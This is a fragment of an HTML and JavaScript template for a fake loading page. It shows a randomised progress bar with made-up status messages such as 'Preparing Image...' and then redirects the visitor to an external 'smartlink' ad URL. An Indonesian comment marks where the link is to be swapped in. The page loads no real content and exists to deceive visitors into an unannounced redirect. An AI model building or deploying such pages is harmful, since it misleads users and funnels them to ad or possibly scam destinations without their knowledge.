      display: flex;
      justify-content: center;

      background: linear-gradient(135deg, #0f172a, #1e293b);

  </style></head><body>  <div class="box">
    <h2>Loading...</h2><div class="progress-container">
  <div class="progress-bar" id="bar"></div>
</div>

<div class="text" id="text">Loading Content</div>

  </div>  <script>
    let progress = 0;
    const bar = document.getElementById("bar");
    const text = document.getElementById("text");

    const messages = [
      "Connecting...",
      "Load data...",
      "Preparing Image...",
      "Almost Done..."
    ];

    let i = 0;

    const interval = setInterval(() => {
      progress += Math.random() * 20;

      if (progress >= 100) {
        progress = 100;
        bar.style.width = progress + "%";
        text.innerText = "Done";

        clearInterval(interval);

        // 🔥 GANTI LINK SMARTLINK DI SINI
        setTimeout(() => {
          window.location.href = "https://fdeddg.hubss.one/p/nhVNy";
        }, 800);

      } else {
        bar.style.width = progress + "%";

        if (i < messages.length && progress > (i+1)*25) {
          text.innerText = messages[i];
          i++;
        }
      }

    }, 300);
  </script></body>
